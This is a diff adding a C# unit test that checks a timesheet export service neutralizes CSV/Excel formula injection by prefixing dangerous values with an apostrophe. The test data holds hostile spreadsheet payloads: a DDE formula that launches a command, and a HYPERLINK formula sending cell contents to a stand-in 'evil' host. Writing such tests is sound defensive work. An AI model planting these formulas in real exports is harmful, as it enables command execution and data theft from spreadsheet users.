@@ -88,6 +88,36 @@ public class ExportServiceTests
     }
 
     [Test]
+    public void BuildRows_NeutralizesFormulaInjection()
+    {
+        var service = new ExportService(new TimeCalculationService(), new HolidayService());
+        var prj = new ProjectCode { Code = "=cmd|'/c calc'!A1" };
+        var entries = new[]
+        {
+            new TimeEntry
+            {
+                WorkDate = new(2026, 6, 10), StartTime = new(9, 0), EndTime = new(17, 0),
+                BreakMinutes = 30, ProjectCode = prj, ProjectCodeId = prj.Id,
+                Notes = "=HYPERLINK(\"http://evil/?\"&A1,\"x\")",
+            },
+            new TimeEntry
+            {
+                WorkDate = new(2026, 6, 11), StartTime = new(9, 0), EndTime = new(17, 0),
+                BreakMinutes = 0, Notes = "+1+1", ProjectCode = new ProjectCode { Code = "PRJ-1" },
+            },
+        };
+
+        var rows = service.BuildRows(entries, new(AustralianState.NSW, 2));
+
+        // Dangerous leading char → prefixed with apostrophe so Excel treats it as text.
+        rows[0].Notes.Should().StartWith("'=HYPERLINK");
+        rows[0].ProjectCode.Should().Be("'=cmd|'/c calc'!A1");
+        rows[1].Notes.Should().Be("'+1+1");
+        // Safe values are untouched.
+        rows[1].ProjectCode.Should().Be("PRJ-1");
+    }
+
+    [Test]
     public async Task ToWorkbookAsync_ProducesNonEmptyXlsx()
     {
         var service = new ExportService(new TimeCalculationService(), new HolidayService());
